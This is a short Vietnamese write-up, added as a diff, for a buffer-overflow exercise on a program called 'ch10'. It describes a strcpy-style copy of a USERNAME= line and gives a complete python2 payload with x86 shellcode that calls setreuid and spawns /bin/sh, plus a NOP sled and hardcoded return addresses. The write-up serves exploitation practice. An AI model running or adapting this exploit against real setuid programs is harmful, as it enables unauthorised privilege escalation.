@@ -1,0 +1,23 @@
+Hàm main gọi hàm Init() với argv[1], 
+cơ chế giống với bài trước khi hàm Init trả về một struct.
+
+Hàm cpstr giống hệt với hàm strcpy.
+
+Hàm Init mở một file với đường dẫn tại argv[1], tiến hành đọc từng dòng 1, 
+nếu dòng có dạng USERNAME= thì copy nó vào init.username, 
+ta sẽ tiến hành tấn công giống với bài trước, 
+ta đặt shellcode vào trong biến init.username, 
+ghi đè return address và vùng nhớ tạm giống nhau, 
+chương trình sẽ return về shellcode. 
+Tại shellcode, ta gọi setreuid(1210, 1110) và system(“/bin/sh”, 0, 0).
+
+
+Biến init.username có địa chỉ là ebp – 0xa4
+
+----------------------------------------------
+
+$ python2 -c "print 'USERNAME=' + '\x31\xd2\x31\xc0\x31\xdb\x31\xc9\x66\xbb\xba\x04\x66\xb9\x56\x04\xb0\x46\xcd\x80\x31\xc0\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80' + '\x90' * 95 + '\x60\xb1\x04\x08' + 'A' * 28 + '\x70\xf9\xff\xbf' + '\x70\xf9\xff\xbf' + '\xaf\x90\xf6\xb7'" > /tmp/exp
+
+$ ./ch10 /tmp/exp
+
+
